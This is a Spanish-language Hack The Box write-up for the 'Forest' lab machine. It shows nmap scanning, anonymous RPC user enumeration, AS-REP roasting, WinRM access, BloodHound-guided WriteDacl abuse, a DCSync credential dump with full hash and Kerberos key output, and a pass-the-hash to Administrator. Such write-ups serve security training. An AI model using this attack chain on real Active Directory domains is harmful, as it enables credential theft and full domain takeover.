---
layout: single
title: Forest - Hack The Box
excerpt: "Un Active Directory bastante sencillo, a la par de divertido. En esta máquina vamos a tocar un ASREPRoast Attack para conectarnos con winrm, y una vez dentro utilizaremos el bloodHound para poder ver una potencial escalada de privilegios. Vamos alla."
date: 2022-03-19
classes: wide
header:
  teaser: /assets/images/htb-writeup-forest/forest_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
   - hackthebox
   - infosec
tags:
   - Active Directory
   - User Enumeration (rpcenum)
   - Kerbrute
   - ASREPRoast Attack
   - Winrm (evil-winrm)
   - BloodHound (SharpHound.ps1)
   - DCSync Attack (PowerView.ps1)
---

![](/assets/images/htb-writeup-forest/forest_logo.png)

# Reconocimiento

Empezaremos enumerando la máquina haciendo uso de la herramienta **nmap**.

```bash

h3g0c1v@kali:~/htb/forest$ nmap -p- --open -T5 -n -v 10.10.10.161
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-19 19:40 CET
Initiating Ping Scan at 19:40
Scanning 10.10.10.161 [4 ports]
Completed Ping Scan at 19:40, 0.09s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 19:40
Scanning 10.10.10.161 [65535 ports]
Discovered open port 53/tcp on 10.10.10.161
Discovered open port 139/tcp on 10.10.10.161
Discovered open port 135/tcp on 10.10.10.161
Discovered open port 445/tcp on 10.10.10.161
Discovered open port 389/tcp on 10.10.10.161
Discovered open port 49666/tcp on 10.10.10.161
Discovered open port 5985/tcp on 10.10.10.161
Discovered open port 49671/tcp on 10.10.10.161
Discovered open port 49676/tcp on 10.10.10.161
Discovered open port 3268/tcp on 10.10.10.161
Discovered open port 49665/tcp on 10.10.10.161
Discovered open port 464/tcp on 10.10.10.161
Discovered open port 49706/tcp on 10.10.10.161
Discovered open port 636/tcp on 10.10.10.161
Discovered open port 49664/tcp on 10.10.10.161
Discovered open port 593/tcp on 10.10.10.161
Discovered open port 9389/tcp on 10.10.10.161
Discovered open port 47001/tcp on 10.10.10.161
Discovered open port 88/tcp on 10.10.10.161
Discovered open port 49684/tcp on 10.10.10.161
Discovered open port 3269/tcp on 10.10.10.161
Discovered open port 49667/tcp on 10.10.10.161
Discovered open port 49677/tcp on 10.10.10.161
Completed SYN Stealth Scan at 19:41, 15.03s elapsed (65535 total ports)
Nmap scan report for 10.10.10.161
Host is up (0.040s latency).
Not shown: 63780 closed tcp ports (reset), 1732 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49671/tcp open  unknown
49676/tcp open  unknown
49677/tcp open  unknown
49684/tcp open  unknown
49706/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.27 seconds
           Raw packets sent: 72391 (3.185MB) | Rcvd: 63926 (2.557MB)


```

Después vamos a ver la versión y servicio que corren para todos esos puertos abiertos y lanzaremos unos cuantos scripts básicos de enumeración. Como son muchos puertos abiertos, quiero verlo un poco más bonito, para ello utilizaré un stylesheet, que se ve bastante bien, y el output lo meteré en el fichero `targetedXML` en formato **XML**.

```bash

h3g0c1v@kali:~/htb/forest$ nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49703 10.10.10.161 --stylesheet=https://raw.githubusercontent.com/honze-net/nmap-bootstrap-xsl/stable/nmap-bootstrap.xsl -oX targetedXML
Nmap scan report for htb.local (10.10.10.161)
Host is up (0.039s latency).

PORT      STATE  SERVICE      VERSION
53/tcp    open   domain       Simple DNS Plus
88/tcp    open   kerberos-sec Microsoft Windows Kerberos (server time: 2022-03-19 19:15:58Z)
135/tcp   open   msrpc        Microsoft Windows RPC
139/tcp   open   netbios-ssn  Microsoft Windows netbios-ssn
389/tcp   open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open   microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
3268/tcp  open   ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
5985/tcp  open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open   mc-nmf       .NET Message Framing
47001/tcp open   http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        Microsoft Windows RPC
49665/tcp open   msrpc        Microsoft Windows RPC
49666/tcp open   msrpc        Microsoft Windows RPC
49667/tcp open   msrpc        Microsoft Windows RPC
49671/tcp open   msrpc        Microsoft Windows RPC
49676/tcp open   ncacn_http   Microsoft Windows RPC over HTTP 1.0
49677/tcp open   msrpc        Microsoft Windows RPC
49684/tcp open   msrpc        Microsoft Windows RPC
49703/tcp closed unknown
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-03-19T19:16:48
|_  start_date: 2022-03-19T18:45:50
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2022-03-19T12:16:50-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
|_clock-skew: mean: 2h26m50s, deviation: 4h02m31s, median: 6m48s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.16 seconds


```

Ahora, si metemos el fichero XML en la ruta `/var/www/html` y activamos el servicio **apache** con el comando **service apache2 start**, veremos como se nos reporta la información en un formato más adecuado y vistoso.

![](/assets/images/htb-writeup-forest/targetedXML.png)

Como veo que el puerto **88 kerberos** a demás de otros, están abiertos, intuyo que estamos ante un **Active Directory** . Por lo que con **crackmapexec** voy a ver un poco más sobre el **DC**.

```bash
h3g0c1v@kali:~/htb/forest$ crackmapexec smb 10.10.10.161

SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```
Vemos que el dominio es **htb.local**, por lo que voy a añadirlo al fichero `/etc/hosts/`.

```bash
h3g0c1v@kali:~/htb/forest$ cat /etc/hosts
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: /etc/hosts
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 127.0.0.1   localhost
   2   │ 127.0.1.1   kali
   3   │ 
   4   │ 10.10.10.161    htb.local FOREST.htb.local EXCH01.htb.local
   5   │ 
   6   │ # The following lines are desirable for IPv6 capable hosts
   7   │ ::1     localhost ip6-localhost ip6-loopback
   8   │ ff02::1 ip6-allnodes
   9   │ ff02::2 ip6-allrouters
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Vamos a ver si hay algún recurso compartido a nivel de red, por **smb** , probando a conectarnos haciendo uso de un **null session**.

```bash
h3g0c1v@kali:~/htb/forest$ smbclient -L 10.10.10.161 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.161 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Y vemos que no hay ningún recurso compartido, por lo que pasaremos de **smb** por ahora.
Como veo que el puerto **88 kerberos** está abierto, voy a intentar conectarme a él utilizando la herramienta **rpcclient**. En caso de que nos deje conectar, intentaré enumerar usuarios válidos del dominio.

```bash
h3g0c1v@kali:~/htb/forest$ rpcclient -U "" -N 10.10.10.161
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[DefaultAccount] rid:[0x1f7]
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]
user:[andy] rid:[0x47e]
user:[mark] rid:[0x47f]
user:[santi] rid:[0x480]
rpcclient $> 
```

Y perfecto, nos ha dejado conectar y podemos enumerar objetos del dominio. Para una enumeración más cómoda, en vez de utilizar la herramienta rpcclient, utilizaré una herramienta que se llama *rpcenum*, que está creada por *s4vitar* y aquí os dejo su herramienta.

	- https://github.com/s4vitar/rpcenum

Así que vamos a enumerar más a fondo utilizando dicha herramienta.

```bash
h3g0c1v@kali:~/htb/forest$ ./rpcenum -e DUsers -i 10.10.10.161

[*] Enumerating Domain Users...

  +                       +
  | Users                 |
  +                       +
  | Administrator         |
  | Guest                 |
  | krbtgt                |
  | DefaultAccount        |
  | $331000-VK4ADACQNUCA  |
  | SM_2c8eef0a09b545acb  |
  | SM_ca8c2ed5bdab4dc9b  |
  | SM_75a538d3025e4db9a  |
  | SM_681f53d4942840e18  |
  | SM_1b41c9286325456bb  |
  | SM_9b69f1b9d2cc45549  |
  | SM_7c96b981967141ebb  |
  | SM_c75ee099d0a64c91b  |
  | SM_1ffab36a2f5f479cb  |
  | HealthMailboxc3d7722  |
  | HealthMailboxfc9daad  |
  | HealthMailboxc0a90c9  |
  | HealthMailbox670628e  |
  | HealthMailbox968e74d  |
  | HealthMailbox6ded678  |
  | HealthMailbox83d6781  |
  | HealthMailboxfd87238  |
  | HealthMailboxb01ac64  |
  | HealthMailbox7108a4e  |
  | HealthMailbox0659cc1  |
  | sebastien             |
  | lucinda               |
  | svc-alfresco          |
  | andy                  |
  | mark                  |
  | santi                 |
  +                       +
```

Bien, vemos que hay algunos usuarios, a mi me interesa ahora mismo los últimos 6 usuarios, por lo que, me quedaré con ellos para meterlo en un fichero, haciendo uso de un one liner.

```bash
h3g0c1v@kali:~/htb/forest$ ./rpcenum -e DUsers -i 10.10.10.161 | tail -n 8 | awk '$NF{print$2}' | grep -v "+" > users.txt

h3g0c1v@kali:~/htb/forest$ cat users.txt 
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: users.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ sebastien
   2   │ lucinda
   3   │ svc-alfresco
   4   │ andy
   5   │ mark
   6   │ santi
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

También podemos enumerar muchas más cosas, pero me interesan únicamente los usuarios que hemos conseguido.


# ASREPRoast Attack

Ahora que tenemos un fichero de usuarios válidos del dominio, voy a intentar realizar un **ASREPRoast Attack** , para intentar obtener el TGT de algún usuario que tenga la opción **UF_DONT_REQUIRE_PREAUTH** establecida, empleando la herramienta `GetNPUsers.py`.

![](/assets/images/htb-writeup-forest/asrep.png)

y ¡ojo!, hemos conseguido un hash **Net-NTLMv2** del usuario **svc_alfresco** . Con este hash, lo único que podemos hacer es intentar crackearlo de forma offile, por lo que utilizaremos la herramienta **john**.

![](/assets/images/htb-writeup-forest/crackhash.png)

Bien, ahora que tenemos la contraseña de **svc_alfresco** , vamos a ver si tenemos capacidad de conectarnos con **winrm**.

![](/assets/images/htb-writeup-forest/winrm.png)

Perfecto, nos pone *Pwn3d!* por lo que podemos conectarnos por winrm, para ello utilizaré la herramienta **evil-winrm**.

![](/assets/images/htb-writeup-forest/winrmconnect.png)

En este punto, podemos visualizar la flag que se encuentra en el directorio `C:\Users\svc-alfresco\Desktop\user.txt`.

![](/assets/images/htb-writeup-forest/usertxt.png)

# Local Privilege Escalation

Ya que estamos dentro de la máquina víctima, podemos recolectar información para con la herramienta **BloodHound** , ver una posible escalada de privilegios. Así que usaré **SharpHound** para recolectar la información, y para poder utilizarlo previamente lo tenemos que *importar*.

![](/assets/images/htb-writeup-forest/shps1.png)

Ahora que tenemos el **.zip** con toda la información podemos meterlo en el bloodhound. Y si miramos la vía más rápida de escalar privilegios, vemos que podemos efectuar un **DCSync Attack**, pero antes tendremos que hacer algo.

![](/assets/images/htb-writeup-forest/treeLPE.png)

Podemos observar que tenemos el privilegio de **WriteDacl** , que si nos vamos a **Abuse Info** podemos ver lo que significa tener ese permiso.

![](/assets/images/htb-writeup-forest/abuse_info_bh.png)

Y si nos vamos un poco más abajo nos indica los comando que tenemos que realizar.

![](/assets/images/htb-writeup-forest/abuse_info_commands_bh.png)

Si hacemos un **net user** de nuestro usuario, vemos que estamos en el grupo **Service Accounts**, lo que nos permite crear usuarios, así que vamos a crear uno, con la contraseña que queramos.

![](/assets/images/htb-writeup-forest/createuser.png)

También le meteremos en el grupo *Exchange Windows Permissions*.

![](/assets/images/htb-writeup-forest/addgroup.png)

Y ahora, vamos a hacer lo que nos dice el **BloodHound**.

![](/assets/images/htb-writeup-forest/seccred.png)

Después tendríamos que llamar a la función **Add-DomainObjectAcl** , por lo que tendremos que importar el **PowerView.ps1**, para que reconozca la función.

	- https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

![](/assets/images/htb-writeup-forest/pwps1.png)

Como hemos importado directamente la función, ya podríamos ejecutar el comando que nos decía el **BloodHound**.

![](/assets/images/htb-writeup-forest/add_domain_object_acl.png)

# DCSync Attack

Vale, una vez hecho esto, ahora deberíamos poder realizar un **DCSync Attack**, así que vamos a probarlo.

```bash
h3g0c1v@kali:~/htb/forest$ impacket-secretsdump htb.local/h3g0c1v@10.10.10.161
Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright 2021 SecureAuth Corporation

Password:
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\$331000-VK4ADACQNUCA:1123:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_2c8eef0a09b545acb:1124:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_ca8c2ed5bdab4dc9b:1125:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_75a538d3025e4db9a:1126:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_681f53d4942840e18:1127:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1b41c9286325456bb:1128:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_9b69f1b9d2cc45549:1129:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_7c96b981967141ebb:1130:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_c75ee099d0a64c91b:1131:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\SM_1ffab36a2f5f479cb:1132:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
htb.local\HealthMailboxc3d7722:1134:aad3b435b51404eeaad3b435b51404ee:4761b9904a3d88c9c9341ed081b4ec6f:::
htb.local\HealthMailboxfc9daad:1135:aad3b435b51404eeaad3b435b51404ee:5e89fd2c745d7de396a0152f0e130f44:::
htb.local\HealthMailboxc0a90c9:1136:aad3b435b51404eeaad3b435b51404ee:3b4ca7bcda9485fa39616888b9d43f05:::
htb.local\HealthMailbox670628e:1137:aad3b435b51404eeaad3b435b51404ee:e364467872c4b4d1aad555a9e62bc88a:::
htb.local\HealthMailbox968e74d:1138:aad3b435b51404eeaad3b435b51404ee:ca4f125b226a0adb0a4b1b39b7cd63a9:::
htb.local\HealthMailbox6ded678:1139:aad3b435b51404eeaad3b435b51404ee:c5b934f77c3424195ed0adfaae47f555:::
htb.local\HealthMailbox83d6781:1140:aad3b435b51404eeaad3b435b51404ee:9e8b2242038d28f141cc47ef932ccdf5:::
htb.local\HealthMailboxfd87238:1141:aad3b435b51404eeaad3b435b51404ee:f2fa616eae0d0546fc43b768f7c9eeff:::
htb.local\HealthMailboxb01ac64:1142:aad3b435b51404eeaad3b435b51404ee:0d17cfde47abc8cc3c58dc2154657203:::
htb.local\HealthMailbox7108a4e:1143:aad3b435b51404eeaad3b435b51404ee:d7baeec71c5108ff181eb9ba9b60c355:::
htb.local\HealthMailbox0659cc1:1144:aad3b435b51404eeaad3b435b51404ee:900a4884e1ed00dd6e36872859c03536:::
htb.local\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc:::
htb.local\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3:::
htb.local\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668:::
htb.local\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b:::
htb.local\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7:::
htb.local\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072:::
h3g0c1v:9603:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
FOREST$:1000:aad3b435b51404eeaad3b435b51404ee:1856a698cf28f6b1efd2992214ade846:::
EXCH01$:1103:aad3b435b51404eeaad3b435b51404ee:050105bb043f5b8ffc3a9fa99b5ef7c1:::
[*] Kerberos keys grabbed
htb.local\Administrator:aes256-cts-hmac-sha1-96:910e4c922b7516d4a27f05b5ae6a147578564284fff8461a02298ac9263bc913
htb.local\Administrator:aes128-cts-hmac-sha1-96:b5880b186249a067a5f6b814a23ed375
htb.local\Administrator:des-cbc-md5:c1e049c71f57343b
krbtgt:aes256-cts-hmac-sha1-96:9bf3b92c73e03eb58f698484c38039ab818ed76b4b3a0e1863d27a631f89528b
krbtgt:aes128-cts-hmac-sha1-96:13a5c6b1d30320624570f65b5f755f58
krbtgt:des-cbc-md5:9dd5647a31518ca8
htb.local\HealthMailboxc3d7722:aes256-cts-hmac-sha1-96:258c91eed3f684ee002bcad834950f475b5a3f61b7aa8651c9d79911e16cdbd4
htb.local\HealthMailboxc3d7722:aes128-cts-hmac-sha1-96:47138a74b2f01f1886617cc53185864e
htb.local\HealthMailboxc3d7722:des-cbc-md5:5dea94ef1c15c43e
htb.local\HealthMailboxfc9daad:aes256-cts-hmac-sha1-96:6e4efe11b111e368423cba4aaa053a34a14cbf6a716cb89aab9a966d698618bf
htb.local\HealthMailboxfc9daad:aes128-cts-hmac-sha1-96:9943475a1fc13e33e9b6cb2eb7158bdd
htb.local\HealthMailboxfc9daad:des-cbc-md5:7c8f0b6802e0236e
htb.local\HealthMailboxc0a90c9:aes256-cts-hmac-sha1-96:7ff6b5acb576598fc724a561209c0bf541299bac6044ee214c32345e0435225e
htb.local\HealthMailboxc0a90c9:aes128-cts-hmac-sha1-96:ba4a1a62fc574d76949a8941075c43ed
htb.local\HealthMailboxc0a90c9:des-cbc-md5:0bc8463273fed983
htb.local\HealthMailbox670628e:aes256-cts-hmac-sha1-96:a4c5f690603ff75faae7774a7cc99c0518fb5ad4425eebea19501517db4d7a91
htb.local\HealthMailbox670628e:aes128-cts-hmac-sha1-96:b723447e34a427833c1a321668c9f53f
htb.local\HealthMailbox670628e:des-cbc-md5:9bba8abad9b0d01a
htb.local\HealthMailbox968e74d:aes256-cts-hmac-sha1-96:1ea10e3661b3b4390e57de350043a2fe6a55dbe0902b31d2c194d2ceff76c23c
htb.local\HealthMailbox968e74d:aes128-cts-hmac-sha1-96:ffe29cd2a68333d29b929e32bf18a8c8
htb.local\HealthMailbox968e74d:des-cbc-md5:68d5ae202af71c5d
htb.local\HealthMailbox6ded678:aes256-cts-hmac-sha1-96:d1a475c7c77aa589e156bc3d2d92264a255f904d32ebbd79e0aa68608796ab81
htb.local\HealthMailbox6ded678:aes128-cts-hmac-sha1-96:bbe21bfc470a82c056b23c4807b54cb6
htb.local\HealthMailbox6ded678:des-cbc-md5:cbe9ce9d522c54d5
htb.local\HealthMailbox83d6781:aes256-cts-hmac-sha1-96:d8bcd237595b104a41938cb0cdc77fc729477a69e4318b1bd87d99c38c31b88a
htb.local\HealthMailbox83d6781:aes128-cts-hmac-sha1-96:76dd3c944b08963e84ac29c95fb182b2
htb.local\HealthMailbox83d6781:des-cbc-md5:8f43d073d0e9ec29
htb.local\HealthMailboxfd87238:aes256-cts-hmac-sha1-96:9d05d4ed052c5ac8a4de5b34dc63e1659088eaf8c6b1650214a7445eb22b48e7
htb.local\HealthMailboxfd87238:aes128-cts-hmac-sha1-96:e507932166ad40c035f01193c8279538
htb.local\HealthMailboxfd87238:des-cbc-md5:0bc8abe526753702
htb.local\HealthMailboxb01ac64:aes256-cts-hmac-sha1-96:af4bbcd26c2cdd1c6d0c9357361610b79cdcb1f334573ad63b1e3457ddb7d352
htb.local\HealthMailboxb01ac64:aes128-cts-hmac-sha1-96:8f9484722653f5f6f88b0703ec09074d
htb.local\HealthMailboxb01ac64:des-cbc-md5:97a13b7c7f40f701
htb.local\HealthMailbox7108a4e:aes256-cts-hmac-sha1-96:64aeffda174c5dba9a41d465460e2d90aeb9dd2fa511e96b747e9cf9742c75bd
htb.local\HealthMailbox7108a4e:aes128-cts-hmac-sha1-96:98a0734ba6ef3e6581907151b96e9f36
htb.local\HealthMailbox7108a4e:des-cbc-md5:a7ce0446ce31aefb
htb.local\HealthMailbox0659cc1:aes256-cts-hmac-sha1-96:a5a6e4e0ddbc02485d6c83a4fe4de4738409d6a8f9a5d763d69dcef633cbd40c
htb.local\HealthMailbox0659cc1:aes128-cts-hmac-sha1-96:8e6977e972dfc154f0ea50e2fd52bfa3
htb.local\HealthMailbox0659cc1:des-cbc-md5:e35b497a13628054
htb.local\sebastien:aes256-cts-hmac-sha1-96:fa87efc1dcc0204efb0870cf5af01ddbb00aefed27a1bf80464e77566b543161
htb.local\sebastien:aes128-cts-hmac-sha1-96:18574c6ae9e20c558821179a107c943a
htb.local\sebastien:des-cbc-md5:702a3445e0d65b58
htb.local\lucinda:aes256-cts-hmac-sha1-96:acd2f13c2bf8c8fca7bf036e59c1f1fefb6d087dbb97ff0428ab0972011067d5
htb.local\lucinda:aes128-cts-hmac-sha1-96:fc50c737058b2dcc4311b245ed0b2fad
htb.local\lucinda:des-cbc-md5:a13bb56bd043a2ce
htb.local\svc-alfresco:aes256-cts-hmac-sha1-96:46c50e6cc9376c2c1738d342ed813a7ffc4f42817e2e37d7b5bd426726782f32
htb.local\svc-alfresco:aes128-cts-hmac-sha1-96:e40b14320b9af95742f9799f45f2f2ea
htb.local\svc-alfresco:des-cbc-md5:014ac86d0b98294a
htb.local\andy:aes256-cts-hmac-sha1-96:ca2c2bb033cb703182af74e45a1c7780858bcbff1406a6be2de63b01aa3de94f
htb.local\andy:aes128-cts-hmac-sha1-96:606007308c9987fb10347729ebe18ff6
htb.local\andy:des-cbc-md5:a2ab5eef017fb9da
htb.local\mark:aes256-cts-hmac-sha1-96:9d306f169888c71fa26f692a756b4113bf2f0b6c666a99095aa86f7c607345f6
htb.local\mark:aes128-cts-hmac-sha1-96:a2883fccedb4cf688c4d6f608ddf0b81
htb.local\mark:des-cbc-md5:b5dff1f40b8f3be9
htb.local\santi:aes256-cts-hmac-sha1-96:8a0b0b2a61e9189cd97dd1d9042e80abe274814b5ff2f15878afe46234fb1427
htb.local\santi:aes128-cts-hmac-sha1-96:cbf9c843a3d9b718952898bdcce60c25
htb.local\santi:des-cbc-md5:4075ad528ab9e5fd
h3g0c1v:aes256-cts-hmac-sha1-96:3a60ce17042804bd8a3c14c0d551ae4adc0f75b24613f8f70a28ffe930689f17
h3g0c1v:aes128-cts-hmac-sha1-96:05eb0b9661dedf0cd302d38c54e91770
h3g0c1v:des-cbc-md5:9251ea49d338f4c7
FOREST$:aes256-cts-hmac-sha1-96:7c3361b1da6a8cc60e1eb669a8d1940396ccdcbcfcd69573130c2d23e3f8f6af
FOREST$:aes128-cts-hmac-sha1-96:279cc5d4fcad2364f847d49c93daec10
FOREST$:des-cbc-md5:ad98323be9700745
EXCH01$:aes256-cts-hmac-sha1-96:1a87f882a1ab851ce15a5e1f48005de99995f2da482837d49f16806099dd85b6
EXCH01$:aes128-cts-hmac-sha1-96:9ceffb340a70b055304c3cd0583edf4e
EXCH01$:des-cbc-md5:8c45f44c16975129
[*] Cleaning up... 
```


# Root

Ahí vemos todos los hashes de los usuarios del dominio. En este punto podremos coger el hash del usuario **Administrator** , y coger la parte NT, para realizar un **Path The Hash**, conectandonos a dicho usuario con ese hash.

![](/assets/images/htb-writeup-forest/paththehash.png)

Como ya estamos como el usuario administrador del dominio, ya nos podremos ir a `C:\Users\Administrator\Desktop` y visualizar la `root.txt`.

![](/assets/images/htb-writeup-forest/roottxt.png)

Espero que te haya gustado esta máquina, puedes ver más como esta en mi página web.
